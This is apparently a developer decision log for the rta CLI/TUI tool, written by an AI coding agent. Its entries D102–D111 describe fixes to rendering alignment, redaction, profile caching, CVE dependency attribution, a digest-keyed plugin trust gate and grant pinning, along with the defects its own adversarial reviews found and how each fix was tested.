| D102 | **Alignment is measured in cells, and the most severe state has a colour.** Asked for *"all infos well shaped with harmonious views, careful of text alignments and legibility"*, audited across every rendering path by four agents and verified by rendering it. **The one that is a security defect**: `view.Redact` masks by column name and says so in its own comment — *"a cell with no column cannot be named, so it cannot be masked"* — and the pretty renderer drew those cells anyway, in a nameless extra column, so a table whose rows outran their headers put the value redaction exists to hide right beside the dots covering its named neighbour. The markdown renderer already dropped them, so two renderers disagreed about the same data, which is the shape of a rule living in a renderer instead of in the view. **The one that is everywhere**: widths were counted with `len()` (bytes) and padded with `%-*s` (runes) against a terminal that draws cells — three units that agree only for ASCII, so a KeyValue column stayed straight until somebody's data had an accent in it and a bar chart lost the shared baseline that is the only thing a bar chart is for. **The one that fails quietest**: an unrecognised status word classifies Neutral and renders with no colour at all, so `sys load` grading itself "overloaded" and `eol` grading a release "EOL" were drawn plainer than the "ok" beside them — the vocabulary learned the words rather than the callers learning to say "fail overloaded". **And the one that moves the screen**: the flash was appended after `fitHintBar` had packed the bar to the full width, while the dashboard budgets its tile rows from the footer's *measured* height, so a long confirmation stole a row the grid had already given to a tile and scrolled the header off the top. Also fixed: a hyphen is no longer a place to break a line (x/ansi treats `-` as a breakpoint always, so `rta explain` wrapped its own command line as `[--` / `endpoint <string>]` — a line nobody can copy and a flag that reads as two things, and every hyphen in this tool is inside an identifier somebody may be about to paste); a right-aligned column's heading sits over its own digits; a wrapped error hangs under its badge measured rather than counted out by hand; a catalogue column is never narrower than its own heading; and two empty panes stop starting their second paragraph a third of the way across, which is what a trailing `\n\n` inside a lipgloss `Render` does. Separately, from the same audit: **`SuggestRequest` carried no surface**, so every external plugin's `Suggest` saw `SurfaceUnknown` — documented as *"a direct in-process caller… inside the trust boundary"* — and the rule that anything which would prompt or take a visible moment must not run on that path had no way to be obeyed by the four plugins that reach off the machine. | Each fix is pinned by a test that fails under revert, and the wrap and indent ones were verified against a real 40- and 80-column pty rather than a buffer. The status test is the one that closes a class rather than three strings: it carries the literals the plugins actually emit, asserts each classifies non-Neutral, and caught me inventing a status `audit` does not emit on its first run. The flash test exists because `layout_test`'s width sweep structurally could not see it — nothing there ever set `m.flash` — and it checks both halves: no line exceeds the terminal, and the footer's measured height rises when a flash is showing, since that measurement is what the grid budgets against. **Two findings were rejected after checking them**: the audit's proposed status-vocabulary rewrite would have broken the two that already worked (`ERROR >90%` classifies correctly; `overloaded` does not), and the footer's own degradation turned out to be fine — it wraps to two lines and only truncates at 40 columns, where it says so with an ellipsis. Deliberately left: the `connBodyHeight` split, the unbounded chart caption, and markdown column alignment, each of which wants its own geometry test rather than a place at the end of a render pass. |
| D103 | **Eight defects an adversarial review of this session's own work found, five of them in the two features it had just shipped.** Asked to *"be critical about your own decision, review and audit everything"*, so the session's diff went back through three lenses with a refutation pass over every claim — thirteen survived, and the ones that mattered were all self-inflicted. **The worst was a regression with a two-keystroke path to it.** `withoutPicker` stripped `profile` from a run's values unconditionally, and `profile` is reserved only on a capability a profile can fill — `builtin/grant` declares it as *data*, because `grant revoke pg --profile staging` names the grant to take back. So `runRevoke` saw an empty profile, skipped its own narrowing filter, and revoked **every** grant on pg across every connection: the widest possible reading of the narrowest possible request, issued from a form that showed the narrow one. The delete had lived inside `resolveProfile` behind its `Profilable` guard until this session moved it. **The second was the drop rule reaching only half the widgets.** `values()` returned from the bool and slice branches before the display check, so `s3`'s `tls` — whose own declaration calls plaintext-against-a-configured-HTTPS-endpoint the downgrade it exists to prevent — came back as a caller value and beat the profile layer; switching the picker from a local MinIO to production moved the endpoint and left the transport setting behind, which is worse than either half. Clearing a seeded box had the same shape: the declared default was handed over as a caller value and beat the environment the picker named. **The third is the one worth remembering as a category.** `internal/recent` recorded values on every run and offered them on none: both surfaces gated completion on "declares Options, Suggest or Path", which excludes every plain String — precisely the set the package exists for. A feature that worked only where a completion already existed, which is the opposite of the point, and every one of its tests passed because they all used fields that had a Suggest. **The fourth was a credential leaving on a keystroke.** The values a sibling's `Suggest` is answered with had no filter, and huh re-evaluates every field's suggestions on every keystroke, so typing into a masked box shipped each *prefix* of the passphrase to the plugin subprocess — and on the shell the resolve's own EnvFallback layer shipped `$RTA_S3_SECRET_KEY` on `--content-type <tab>`. The receiving process is the one that would legitimately be handed it at Run, so this is early and unasked-for delivery rather than a new principal learning it; `plugin.CompletionRequest` is now the one builder both surfaces use, because a rule that lives in two places holds in one. **And the fifth was half a fix made worse.** Taking tab off "next field" to make it complete left it a dead key everywhere there was nothing to complete — which is most of the time, since bubbles only matches a suggestion against a *non-empty* value, so a box nobody has typed in yet swallowed it on every field of every form, and on a masked box the text typed next went into the password with nothing on screen to show it. Bound to both now. | Every fix is pinned by a test that fails under revert with the words of the bug — *"the capability's own profile input was stripped: map[target:pg]"*, *"the endpoint moved and the transport did not"*, *"after tab the box holds \"my-\" — the shortlist was never attached"*, *"the next field's text went into the masked box"*. **Three lessons, none of them new to this repo.** A guard removed from one function has to be re-established in the function it moved to, and `Profilable` is that guard in three places now. A feature whose tests all use the easy case is a feature that has not been tested — every completion test used a field with a `Suggest`, which is exactly the set the new code did not need to reach. And a credential's containment is a property of the *declaration*: `builtin/http` declared `bearer` and `basic` as plain Strings, so they were drawn in the clear in a form and written to disk, which is fixed at the declaration and backstopped twice in `internal/recent` — a name that reads as a credential is never remembered, and an Authorization header is refused whatever field it arrived on — because the next plugin to get this wrong is not one this repo can edit. Also fixed from the same pass: a row action re-aimed at whatever was switched on rather than the connection its row came from; a comma list that only completed if you typed a space after the comma; and a value with a newline in it being offered as one completion entry. |

| D104 | **A cached environment keyed on its name outlived what the name meant.** Reported as *"using the profile doesn't retrieve correct infos on update — I had to quit and relaunch the TUI to get endpoints, host, region, for s3 and pg"*, after rebuilding both plugins and re-pinning their profiles. `syncActive` compared the *name* of the environment switched on, which is the one thing about an environment that does not change when its meaning does — so switching to one resolved it once and nothing resolved it again. Every form afterwards was seeded from the connection as it stood at the switch, and — the half with no symptom — every command *ran against* it: the header said the right environment, the boxes said the old values, and the call went where the boxes said. Relaunching was the only way out. Fixed by keying on what the environment *states* rather than what it is called: `profile.Stamp` fingerprints the connections (every plugin key including its pin, every `set:` value, every secret reference, the ttl) and `kv.StoreStamp` identifies the store those references are read out of, so rotating a credential mid-session counts too. **Doing it this way rather than invalidating from each writer is the point** — seven places in `internal/render/tui` write a profile, `rta profile edit` writes one from another terminal and `$EDITOR` writes one from nowhere in particular, and requiring each to remember is the arrangement that produced this: the plugin-config editor remembered, the profile editors did not, and `rta profile edit` could never have. Checked in three places for three windows: on the refresh tick, on the way out of every editor, and — because a run does not wait for a tick — at the point of use, where a stale bind falls through to resolving synchronously, which is the same Lookup and Fill the bind does. | Teeth-proven twice, in both halves: reverted to the name comparison, `TestEditingTheSwitchedOnEnvironmentTakesEffectWithoutRestarting` reports *"the command would run against map[host:prod.internal] — the edit did not reach it"* and *"the form would open on … — the screen and the call disagree"*; reverted to `m.bound` at the point of use, `TestARunBetweenTicksSeesTheEdit` reports *"a cached bind outlived what it described"*. The stamp has its own tests for every stated thing an operator can edit — a value, a key added, a key removed, a re-pointed secret, a changed ttl, a re-pinned plugin, a second plugin, a cluster coordinate — and for the two properties a cache key needs: stable across twenty reads of one file, and unforgeable by moving the separator into a value. Tile refreshes deliberately keep reading the cache directly, because both answers available to them when it is stale are wrong in a way that layer cannot fix — running a tile unprofiled is a real connection to the plugin's base configuration — so their window is bounded instead. |
| D105 | **A vulnerable dependency now says whether you asked for it, and what pulled it in.** Asked for *"the ability to track in which package, direct or indirect, a CVE is found, and the full dependency tree to see where the vulnerability is coming from — we want to react as fast as possible"*. The advisory list answers *are we affected*; this answers the question half a second later that decides the rest of the day, because a package the project names itself is a version bump and a package four levels down is somebody else's release. Every lockfile already on disk records some of it, so nothing is resolved, run or fetched: `go.mod`'s `// indirect` marker, `package-lock`'s root entry and per-package dependencies, pnpm's `importers` and `snapshots`, both yarn dialects (Berry's workspace entries are the only place a `yarn.lock` states what is direct), bun's `workspaces`, the `[[package]]` records uv/Poetry/Cargo share, `Gemfile.lock`'s `DEPENDENCIES` block, composer's `require` maps, pip-compile's `# via` annotations, and CycloneDX's dependency graph. **Three rules keep it from inventing anything.** A format that does not record the split says *nothing* rather than "indirect" — a plain `requirements.txt` is a hand-written list or a `pip freeze` and nothing in it says which, so an unannotated one produces the zero graph. Edges are between *names*, because a lockfile edge carries the range the dependant asked for and resolving it would be reproducing a package manager; where that matters the report shows every chain it found rather than picking one. And the graph parsers are a second pass sharing no code with the component parsers, so a mistake there costs an explanation and can never cost a version. Where the file cannot say — `go.mod` marks the relation and stores no edges at all — the report hands over the native command with the package already in it, chosen from the lockfile rather than the ecosystem because `npm why` in a pnpm repository is a wasted paste. `rta audit why <package>` is the same question asked deliberately, drawn as a tree inverted so the routes share their near ends. | Verified against this repository's own `go.mod`: 31 direct + 72 indirect = 103, matching `grep -c "// indirect"` exactly. One realistic fixture per format, each keeping the shapes that decide the parse — pnpm's peer suffix, Poetry's `files = [` array sitting between a package and its dependency table, Berry's `workspace:` resolution, Cargo's sourceless workspace member, a scoped npm name. PyPI names are normalised per PEP 503 because Poetry really does write `name = "jinja2"` and `Jinja2 = ">=3.1.2"` three lines apart, and without it a chain stops one step short in silence. The walk is bounded three ways and every bound announces itself: a chain cut by depth is prefixed so it cannot read as one that reached the top, cycles terminate and still explain, and a step budget holds against a graph shaped by somebody else — proved on a forty-by-forty layered graph where the number of distinct routes is astronomical. |
| D106 | **A table stops being a grid when there is no room for one, and a detail page says more than a summary line.** Reported as *"on small screens the audit details are truncated without the link — add a show more, a tooltip or whatever"*. Three defects under one complaint. **The link was destroyed on every screen, not small ones**: `clip()` cuts a detail at ninety-six runes and the advisory URL was the last thing in it, so every vulnerable row read `… — https…` on a hundred-column terminal as reliably as on a forty-column one. It is a field now, and the table grows a Link column only when something in it has one. **The grid was the wrong shape**: five columns in sixty cells gave each one ten, and a finding read as a column of syllables with the borders spending a sixth of each line saying where the gutters were. Below the width a grid needs, the same rows are drawn as records — one block per row, one line per field — decided per column and about the *text* columns, since a status is six cells wide and charging it a share of the squeeze is how the prose beside it ends up at ten; water-filling rather than an average, because one wide prose column beside a narrow one averages comfortably while the narrow one is at four. Only where a width was measured from a real terminal, so a pipe is byte-identical. **And a hyphen was still a break point inside a table cell**: `wrap()` has shielded them since `rta explain` broke `--endpoint` in half, and a lipgloss table does its own wrapping and never went through it, so a narrow grid produced `GHSA-qw6h-vgh9-` / `j6wx` — an advisory ID that cannot be copied off the screen, in the report whose entire purpose is to be acted on. | Verified by rendering it at 45, 50, 60, 80, 100 and 120 columns through a real pty, and on the live dashboard where `todo.list` flips to records at a tile's width. Three properties the layout has to keep, each a test: redaction (moved above the layout decision, because it is a rule about what may be *drawn* rather than how it is arranged, and a cell with no column is still drawn nowhere), the selected row (marked as well as banded, since `--no-color` leaves a band as nothing), and a name that says what it is — a bare `2` heading a block reads as a stray figure where `ID │ 2` under a heading never could, so a kinded first column keeps its label. A value that cannot be broken and cannot fit beside its label takes the line to itself, which is the URL case and the one this started from. Also fixed: the compact table and the detail page went through the same ninety-six-character clip, so the page somebody opens *because* the line was not enough said exactly as much. |
| D107 | **Being on `$PATH` is not consent.** Asked *"what about trusted plugin sources to reduce the risk of malicious plugins, as implemented in bun, pnpm"*, and the analogue turned out to be exact. rta loads a plugin by *running* it — that is how it learns what the plugin declares — so a file called `rta-plugin-anything`, dropped into any directory on any `$PATH` entry, executed on the next `rta` invocation, **including the `rta __complete` a tab press runs**. Nobody typed a command naming it, nobody approved anything, and the first sign of it would have been a process. That is the shape npm's install scripts had and that bun and pnpm answered with a trusted-dependency list: the package is installed, and its lifecycle scripts do not run until somebody says so. rta's lifecycle script is the Describe handshake, because that is where a stranger's code executes. So an artifact runs once `rta plugin trust <name>` has approved it — **keyed on the content digest**, the same rule `--allow-destructive <id>@<digest>` (ADR 0015) and `plugins.<ns>@<digest>` (ADR 0016) already follow, because trusting a *name* would trust whatever is called that tomorrow, which is exactly the substitution the check exists to notice. A rebuild needs approving again, and that is the feature rather than the cost. Kept in the data directory beside the grant file and never in config: a digest names the same bytes everywhere, and that is the problem — config is the file people commit, copy between machines and clone from a colleague's dotfiles, and trust that travels in a shared file is trust nobody granted. `rta plugin dev` is exempt, which is the rule applied rather than an exception to it: the operator named a source directory in the command they just typed and rta compiled it in front of them. | **Failing closed is tested per failure, not asserted.** An absent, corrupt, truncated or directory-shaped record trusts nothing; an artifact that could not be hashed is never trusted, which matters because every failure path in `Identify` hands back an empty `Identity` and the empty digest is therefore the load-bearing zero value. Proved by a canary — a shell script whose only behaviour is to leave a file when it runs, so what is being tested is whether a stranger's *code executes*, not whether it registers; remove the gate and the file appears, in every one of those four cases. The hash moved out of `Open` into `openIdentified` so `LoadInto` checks the digest it is about to launch: one read of the file, no window between deciding and running. **A trust gate's failure mode is silence**, so nothing is silent — `rta plugin list` carries the untrusted ones in the inventory with no capability count and no summary (both are things the plugin says about *itself*, and asking would mean running it), `rta doctor` warns per plugin, `rta plugin trust` with no argument lists what is waiting, and startup prints one line gated on stderr being a terminal, because repeating a pending decision into a script's stderr on every invocation is how a message stops being read anywhere. |

| D108 | **Sixteen defects an adversarial review of D104–D107 found, plus one that only real data could show.** Asked to *"review and audit everything"*, so the four features went back through a review that fuzzed the parsers, measured the graph builder and read the trust gate for a way past it. Nine were worth fixing and three were the same failure in three places. **The one with the widest blast radius was a substring match.** `isLocalSource` looked for "path" anywhere in the text it was given, and it was given the source string — so `source = "git+https://github.com/acme/pathfinder"` read as "a directory on this machine" and the crate was **dropped from the inventory entirely**: never sent to OSV, never counted, never mentioned. A private index URL (`nexus.corp/repository/pypi-pathways`) does it too. A shorter report that looks complete is the worst failure this plugin has, and it was reachable from an ordinary git dependency. **The second inverted both directions at once.** poetry.lock has no record for the project — the format's own row in the table says its direct set lives in pyproject.toml — but the scanner treated any *local* record as the project, so a single `mylib = {path = "../mylib"}` put that library's dependencies into the direct set and switched on `stateIndirect` for the whole file, which then marked every genuine top-level dependency "indirect". Which record is "the project" is a per-format question now, and the shared TOML scanner is told which of the three it is reading. **The third was quadratic on the happy path**: the edge bound was checked by walking the whole map on every insert, measured at 6.1 s for 100,000 edges — so the bound itself permitted around twenty-five seconds of map-walking on a large pnpm monorepo before any network call. 15 ms now. **And the one real data found rather than the review**: running against five actual lockfiles showed a project asking for `commander: ^15.0.0` whose tree holds 15.0.0, 7.2.0 and 8.3.0, with all three reported "a direct dependency" — an advisory against 7.2.0 sending somebody to bump a version in a package.json that has nothing to do with that copy. Nine such components in one lockfile, twelve in another. | The npm-family formats all state which version a direct dependency resolved to — npm and bun key a hoisted copy by its bare name and a nested one by the path, pnpm writes the version under each importer's dependency, Berry records the spec a workspace asked for against the entry that answers it — so the fix is exactness rather than a retreat, and where no format pins it the relation is unstated rather than guessed. Verified against a real `bun.lock`: 27 components reported direct against 22 dependencies in the package.json beside it; it is 22 now. **The TUI half was two defects on the path that decides which server a command reaches.** A lapsed activation went on supplying its credentials, because the stamp answers "does this binding still describe what the environment says" and cannot answer "is that environment still in force" — both a deadline lapsing and an `rta use --off` elsewhere change the *selection* and touch no profile, and the tick that would have noticed only runs on the dashboard, so the gap was open exactly as long as a form was. And `resolveProfile` called `currentBind()` twice: wasteful, and worse than wasteful, because the file can change between the two calls, so the branch is entered on the first answer and indexes a nil map on the second — "not covered", which sends the command to the plugin's *base connection* while the header says staging. Also fixed: a Berry `patch:` resolution embeds a second name@range so the last `@` is not the separator (`fsevents@patch:fsevents` was printed as the cause of a vulnerability); pip-tools' `# via myproject (pyproject.toml)` invented a package named after a filename; `# viable replacement pending` was read as an annotation and switched the whole file from "states nothing" to "states a graph"; duplicate edges drew every route twice in `audit why`; the record layout overflowed the terminal it exists to fit, at every width below thirty-one; and `plugintrust.read()` swallowed its errors, so an unreadable record was rewritten with one entry in it — destroying every prior approval and reporting success. **Two findings were answered with a contract rather than code**: trust is evaluated once per process, so a running session keeps the plugin it loaded and `rta plugin untrust` says so, because re-checking lazily would make revocation work sometimes and not others with nothing on screen to say which. |
| D109 | **Three defects in code shipped the same day, then the control both profile ADRs called required.** Asked *"what would you do now?"*, so the answer had to be argued rather than picked: a review of the five D108 fix commits plus every surface the trust gate touches, then the work in severity order. **D104's version-exact pinning was measured on single-project lockfiles and is wrong on a monorepo.** Only one copy of a package is hoisted to the top of a tree, and it is not necessarily the one being asked about — two workspaces wanting `commander` at `^7.2.0` and `^11.0.0` get one copy at the top and one nested beside whichever workspace lost, and both parsers pinned the hoisted copy for *every* declaration of the name. So a dependency named, by name, in a package.json one directory down was reported "indirect"; where the hoisted copy is purely transitive it is worse, with a copy nobody asked for reading "direct" and the declared one reading "indirect" — both answers inverted, which is the exact defect D104 exists to remove. Fixed by attributing each declaration to the manifest that made it: npm gets Node's own resolution walked upward from the declaring manifest, and bun keys a nested copy by the holding package's **name** (`@acme/toolkit/commander`), which no reasoning about directory paths would have produced and which was read off a lockfile bun wrote. A pin is a claim about every copy of a name, so it is now made only from a complete answer — a declaration that resolves to nothing leaves the name unpinned rather than letting a partial pin assert "indirect" about the rest. Two more of the same shape: one manifest's pin spoke for another manifest's package after a merge, and a pnpm project that is not a monorepo has no `importers:` block at all — v5 and v6 write the root's own `dependencies:` at column zero, one level up from the shape the scanner was built around, so on a real vitepress project all 88 components came back "the format did not say" while the format said it on line three. Verified against eight real lockfiles across npm, pnpm and yarn berry; every one now matches the manifests beside it, the two monorepos checked against every workspace package.json rather than the root's. | **D107's trust gate was honest only where plugins get listed.** `rta plugin list`, `rta doctor` and a startup line carried the refused artifacts; every other surface either said nothing or named the wrong cause, and the wrong cause was always "not installed" about a plugin rta can see, has hashed and is deliberately declining to run. The TUI was worst, because it is where the startup line cannot be read — written to the primary buffer, covered by the alternate screen before anyone sees it — and its plugins pane, whose own comment says its job is *"which plugins do I actually have?"*, was built from the registry alone, under a confident "N installed" that left them out. They are rows now, naming the command but not offering to run it: trust is read once per process before anything is launched, so approving from inside a running TUI would change a file and load nothing. With it: a profile naming an untrusted plugin was refused as "not a registered plugin" (trust is keyed on the digest, so a rebuild drops the approval and one rebuilt plugin takes an environment spanning four working ones off the air); `rta mcp serve` reported nothing at all, because the line is gated on stderr being a terminal and under an MCP client it is a pipe the client owns; and `rta doctor` claimed `plugins.<ns>` "still serves the CLI" for a section it had warned was dead two rows above. Also: an artifact trusted under two names could only be withdrawn by one, so `rta plugin untrust <the other name>` reported failure while the approval stood; and a record label wider than the terminal was emitted raw. **Then `Grant.ProfilePin`** — ADR 0019 and ADR 0020 both carry the same paragraph, *"required the moment stage 2 lands"*, and it was built ahead of stage 2 because it is the stated prerequisite and because fixing D108's TUI bug had already produced the primitive. `Profile` narrows a grant to a name, and a name is a label over values somebody can edit; a grant now carries `profile.ConnStamp` of the connection consented to, and `grant.pinned` filters out any whose stamp no longer matches what the call will be filled from. A filter rather than a check beside the gate, for `bounded`'s own reasons: a second refusal would be two sentences that can drift and, over MCP, an oracle separating "granted, then edited" from "never granted". Proved end to end — with the filter disabled the test reports *"the grant followed the name to a different connection; the handler saw prod.internal"* for a grant issued against staging. |
| D110 | **Fifteen findings from reviewing D109 the day it landed, including a data-loss bug the pin made ordinary — and one conclusion of mine the review reversed.** Asked *"what should we do now?"*, the answer was to review before building Kubernetes: a security control had shipped that nobody had tried to break, and the previous round found three serious defects in code that felt finished. **The worst was Reserve writing the filtered grant set back over the whole file.** It decides against a subset — `bounded` drops what the switched-on environment puts out of reach, `pinned` drops what was consented to against a different connection — and then saved that subset, so the first use-limited call erased every row the filters had dropped. `bounded` had it already; `pinned` made it ordinary, because pins are per namespace: one profile configuring `pg` and `kv`, with a grant for each, loses the `kv` grant the moment an unrelated `pg` call runs. It destroyed precisely the row the feature depends on — a repointed grant is listed `(changed)` so the operator can re-consent — and it is the hazard `Mutate`'s own comment names, *"a writer that round-trips through Load deletes every row it was not shown, merely by saving"*, reached through two filters instead of one. The two are now one function returning each survivor's position, so there is no subset to hand to Save. **`refund` gave back uses the call never took**, by recomputing: it walked the scopes and gave a use back to the first grant covering each, restarting every time, so a call that spent on a wide grant and a narrow one walked into the same grant twice — the budget stayed the same size and *moved*, a use scoped to one record coming back as a use on any record. Reserve remembers what it took. | **A grant re-issued after an edit could never work.** The gate compared against a startup snapshot while `rta grant allow` stamped from the file, so one edit put the two permanently beyond reach: the operator followed the remedy `rta doctor` prints, saw every call refused with the ungranted sentence, and had nowhere to learn why, since `grant list` and `doctor` read the file and reported the grant healthy. D109 rejected fresh stamping for offering *"a remedy that could never work"* — the snapshot had that property permanently rather than transiently. A call resolves from the file now; the schema stays a snapshot because it is sent once. **And the review reversed me on the seal.** D109's scoping flagged that a downgrade would report the file forged; I wrote a test, concluded the hazard did not exist, deleted the fix and committed a comment saying so. The test was built backwards — it injected an unknown field into a file this build had *already sealed*, which proves a field added after sealing is uncovered, true and not the question. Sealed *with* the field, the reader re-encodes without it and the MAC fails; the original concern was right. Also fixed: two distinct connections could share one `ConnStamp`, because canonical() joined list elements with `\x1f` and map pairs with `\x1e` and trusted no value to contain them — a rule YAML lets values break with a `\xNN` escape; `grant renew` printed a fresh deadline on a grant authorizing nothing, the one person-facing surface silent about it; an untrusted artifact named after a registered namespace made four surfaces claim an exposed plugin was unavailable and offer `rta plugin trust`, which the next start refuses for a namespace collision; and npm's parser pinned the empty string for an entry with no `version`, inverting the relation. **Two process notes.** `git add -A` swept two scratch probes a read-only review agent had written into the checkout, and main was red from the moment that commit landed. And `spend()` is gone — its work folded into Reserve, where the tally and the write can no longer disagree about which set they are talking about. |
| D111 | **The grant package had two gates, and its concurrency test guarded the one nobody called.** Asked *"what's the next thing to do now?"*, the answer was the third review pass — the two before it had each found a HIGH in the previous pass's work, so a third was not obviously wasted. It found `Check` and `Consume`: exported, in a security package, with **zero callers anywhere in the tree**. The bridge has always called `Reserve`. `Check`'s own doc comment said *"It is the whole enforcement: the MCP bridge calls it before Run"*, which was the sentence that would have sent the next caller to the weaker of the two — because `Check` applied the pin filter but not the active bound, so the package's two exported entry points answered differently about the same call. `Consume` was worse: raw `Load()` with neither filter, so it would spend uses from grants both refuse, and an independent scope walk with no tally — the exact shape `allocate()`'s comment says it exists to replace. **The measurement is what makes this more than tidying.** `Reserve` could be stripped of `acquireLock()` entirely and the whole suite stayed green under `-race -count=3`, because `TestConcurrentConsumeDoesNotOverspendAOneTimeGrant` — *"the whole point of the lock"* — raced the dead twin. Pointed at `Reserve`, the same edit fails loudly: 16 of 16 concurrent calls authorized against an 8-use grant, the file recording 2.
